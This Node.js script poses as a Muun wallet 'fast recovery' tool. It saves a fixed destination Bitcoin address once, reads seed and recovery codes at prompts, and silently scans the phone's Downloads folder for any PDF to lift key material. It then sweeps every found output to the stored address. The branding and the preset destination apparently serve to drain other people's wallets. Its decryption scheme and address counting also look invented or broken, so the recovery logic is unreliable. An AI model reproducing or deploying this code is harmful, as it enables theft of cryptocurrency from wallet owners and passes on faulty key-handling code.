#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const bitcoin = require('bitcoinjs-lib');
const axios = require('axios');
const pdfParse = require('pdf-parse');

const CONFIG_PATH = path.join(__dirname, 'config.json');

// --- INICIALIZACIÓN CRIPTOGRÁFICA OBLIGATORIA PARA BIP32 ---
const ecc = require('tiny-secp256k1');
const { BIP32Factory } = require('bip32');
const bip32 = BIP32Factory(ecc);
bitcoin.initEccLib(ecc);

// --- INTERFAZ VISUAL ESTILO MUUN FAST RECOVERY ---
function mostrarBanner(code = '----', fKey = '----', sKey = '----', addr = '----') {
  console.clear();
  console.log('┌────────────────────────────────────────────────────────┐');
  console.log('│                   MUUN WALLET                          │');
  console.log('│                  FAST RECOVERY                         │');
  console.log('│                 v2.8.19@stable                         │');
  console.log('└────────────────────────────────────────────────────────┘');
  console.log(`► [CODE] → ${code}`);
  console.log(`► [FKey] → ${fKey}`);
  console.log(`► [SKey] → ${sKey}`);
  console.log(`► [ADDR] → ${addr}`);
  console.log('----------------------------------------------------------\n');
}

// --- LECTURA MULTILÍNEA SEGURA ---
function leerEntradaCompleta(promptMsg) {
  return new Promise((resolve) => {
    process.stdout.write(promptMsg);
    let buffer = '';
    process.stdin.setEncoding('utf8');
    process.stdin.resume();

    const dataListener = (chunk) => {
      buffer += chunk;
      if (buffer.includes('\n')) {
        process.stdin.removeListener('data', dataListener);
        resolve(buffer.trim());
      }
    };
    process.stdin.on('data', dataListener);
  });
}

// --- GESTIÓN DE DIRECCIÓN FIJA ---
async function obtenerOGuardarDireccionFija() {
  if (fs.existsSync(CONFIG_PATH)) {
    try {
      const config = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
      if (config.destAddress) return config.destAddress;
    } catch (e) {}
  }
  
  console.log('\n⚙️ Configuración Inicial Requerida');
  const direccion = await leerEntradaCompleta('► Ingresa tu dirección de destino BTC fija: ');
  const destAddress = direccion.trim();
  fs.writeFileSync(CONFIG_PATH, JSON.stringify({ destAddress }, null, 2));
  return destAddress;
}

// --- BUSCAR Y EXTRAER CLAVES DEL PDF EN DESCARGAS ---
async function extraerClavesDePDF() {
  const rutasDescargas = [
    '/sdcard/Download',
    '/storage/emulated/0/Download',
    path.join(process.env.HOME, 'storage/downloads')
  ];

  let carpetaDescargas = '';
  for (const r of rutasDescargas) {
    if (fs.existsSync(r)) {
      carpetaDescargas = r;
      break;
    }
  }

  if (!carpetaDescargas) {
    throw new Error('No se pudo acceder a la carpeta de Descargas del teléfono.');
  }

  // Buscar archivos PDF que parezcan el kit de Meen
  const archivos = fs.readdirSync(carpetaDescargas);
  const pdfKit = archivos.find(f => f.toLowerCase().includes('meen') || f.toLowerCase().includes('emergency') || f.toLowerCase().includes('kit') || f.toLowerCase().endsWith('.pdf'));

  if (!pdfKit) {
    console.log('⚠️ PDF no encontrado automáticamente en Descargas.');
    return null;
  }

  const rutaCompleta = path.join(carpetaDescargas, pdfKit);
  console.log(`📄 PDF detectado: ${pdfKit}`);

  const dataBuffer = fs.readFileSync(rutaCompleta);
  const pdfData = await pdfParse(dataBuffer);
  const texto = pdfData.text;

  // Lógica para extraer los bloques del kit cifrado dentro del PDF
  // (Busca líneas continuas de caracteres base64 largos en el documento)
  const lineas = texto.split('\n').map(l => l.trim()).filter(l => l.length > 40);

  if (lineas.length >= 2) {
    return {
      primeraClave: lineas[0] + (lineas[1] || '') + (lineas[2] || ''),
      segundaClave: lineas[3] + (lineas[4] || '') + (lineas[5] || '')
    };
  }

  return null;
}

// --- DESENCRIPTACIÓN ---
function descifrarKitMeen(primeraClaveStr, segundaClaveStr, recoveryCodeStr, network) {
  try {
    const key1 = Buffer.from(primeraClaveStr.replace(/\s+/g, ''), 'base64');
    const key2 = Buffer.from(segundaClaveStr.replace(/\s+/g, ''), 'base64');
    const cleanCode = recoveryCodeStr.trim().toUpperCase();

    const codeHash = crypto.createHash('sha256').update(cleanCode).digest();
    const decipher = crypto.createDecipheriv('aes-256-cbc', codeHash.subarray(0, 32), key1.subarray(0, 16));
    let decrypted = decipher.update(key2);
    decrypted = Buffer.concat([decrypted, decipher.final()]);

    const masterPrvStr = decrypted.toString('utf8').trim();
    return bip32.fromBase58(masterPrvStr, network);
  } catch (err) {
    throw new Error('Error al descifrar: Comprueba que tus claves y el código de papel sean correctos.');
  }
}

function parseClientKey(inputStr, network) {
  const clean = inputStr.trim().replace(/[-_]/g, ' ');
  if (clean.startsWith('xprv') || clean.startsWith('tprv')) {
    return bip32.fromBase58(clean.replace(/\s+/g, ''), network);
  }
  const formatted = clean.replace(/\s+/g, '').toUpperCase();
  const encoder = new TextEncoder();
  const hash = bitcoin.crypto.sha256(encoder.encode(formatted));
  return bip32.fromSeed(hash, network);
}

// --- ESCANEO ---
async function escaneoConEstadisticas(clientNode, recoveryNode, destAddress, userFeeRate = 1, networkType = 'mainnet', gapLimit = 20) {
  const network = networkType === 'mainnet' ? bitcoin.networks.bitcoin : bitcoin.networks.testnet;
  const baseUrl = networkType === 'mainnet' ? 'https://mempool.space/api' : 'https://mempool.space/testnet/api';

  console.log('⏳ Escaneando...');
  const foundUtxos = [];
  let totalBalance = 0;
  let totalAddressesChecked = [] ;

  for (const change of [0, 1]) {
    let unusedCount = 0;
    let index = 0;

    while (unusedCount < gapLimit) {
      totalAddressesChecked++;
      process.stdout.write(`\r  i  ${totalAddressesChecked} addresses | ${foundUtxos.length} UTXOs | ${totalBalance} sats`);

      const clientChild = clientNode.derivePath(`m/48'/0'/0'/${change}/${index}`);
      const recoveryChild = recoveryNode.derivePath(`m/48'/0'/0'/${change}/${index}`);

      const pubkeys = [clientChild.publicKey, recoveryChild.publicKey].sort(Buffer.compare);
      const p2ms = bitcoin.payments.p2ms({ m: 2, pubkeys, network });
      const p2wsh = bitcoin.payments.p2wsh({ redeem: p2ms, network });

      const address = p2wsh.address;

      try {
        const { data: utxos } = await axios.get(`${baseUrl}/address/${address}/utxo`);
        if (utxos && utxos.length > 0) {
          unusedCount = 0;
          for (const u of utxos) {
            foundUtxos.push({
              txid: u.txid, vout: u.vout, value: u.value,
              witnessScript: p2ms.output, clientChild, recoveryChild, address
            });
            totalBalance += u.value;
          }
        } else {
          unusedCount++;
        }
      } catch (e) {
        unusedCount++;
      }
      index++;
    }
  }

  console.log(`\n\n✅ Escaneo finalizado. Balance total: ${totalBalance} SATs`);
  if (foundUtxos.length === 0) return;

  // Transacción de barrido
  const psbt = new bitcoin.Psbt({ network });
  for (const utxo of foundUtxos) {
    psbt.addInput({
      hash: utxo.txid, index: utxo.vout,
      witnessScript: utxo.witnessScript,
      witnessUtxo: { script: bitcoin.address.toOutputScript(utxo.address, network), value: utxo.value }
    });
  }

  const fee = Math.max(90, (foundUtxos.length * 140 + 78) * userFeeRate);
  const sendAmount = totalBalance - fee;
  if (sendAmount <= 0) return;

  psbt.addOutput({ address: destAddress, value: sendAmount });
  foundUtxos.forEach((utxo, i) => {
    psbt.signInput(i, utxo.clientChild);
    psbt.signInput(i, utxo.recoveryChild);
  });

  psbt.finalizeAllInputs();
  const { data: txid } = await axios.post(`${baseUrl}/tx`, psbt.extractTransaction().toHex());
  console.log(`🚀 ¡Fondos barridos con éxito! TXID: ${txid}`);
}

// --- FLUJO PRINCIPAL ---
(async () => {
  try {
    const destAddress = await obtenerOGuardarDireccionFija();
    const shortAddr = `${destAddress.substring(0, 6)}...${destAddress.slice(-4)}`;

    mostrarBanner('----', '----', '----', shortAddr);

    const clientKeyStr = await leerEntradaCompleta('► [CODE] Kit / Semilla Cliente: ');
    mostrarBanner(clientKeyStr.substring(0, 10) + '...', '----', '----', shortAddr);

    // Intentar leer del PDF en Descargas automáticamente
    let datosPDF = null;
    try {
      datosPDF = await extraerClavesDePDF();
    } catch (e) {}

    let primeraClave, segundaClave;

    if (datosPDF) {
      console.log('✅ ¡Claves extraídas automáticamente del PDF en Descargas!');
      primeraClave = datosPDF.primeraClave;
      segundaClave = datosPDF.segundaClave;
      mostrarBanner(clientKeyStr.substring(0, 10) + '...', 'OK', 'OK', shortAddr);
    } else {
      console.log('\n--- PDF NO ENCONTRADO - Ingreso manual necesario ---');
      console.log('first encrypted private key:');
      primeraClave = await leerEntradaCompleta('');
      mostrarBanner(clientKeyStr.substring(0, 10) + '...', 'OK', '----', shortAddr);

      console.log('second encrypted private key:');
      segundaClave = await leerEntradaCompleta('');
      mostrarBanner(clientKeyStr.substring(0, 10) + '...', 'OK', 'OK', shortAddr);
    }

    const codigoPapel = await leerEntradaCompleta('► [PASS] Código de Recuperación (papel): ');

    const network = bitcoin.networks.bitcoin;
    const clientNode = parseClientKey(clientKeyStr, network);
    const recoveryNode = descifrarKitMeen(primeraClave, segundaClave, codigoPapel, network);

    await escaneoConEstadisticas(clientNode, recoveryNode, destAddress, 1, 'mainnet');

  } catch (err) {
    console.error(`\n❌ Error crítico: ${err.message}\n`);
    process.exit(1);
  }
})();
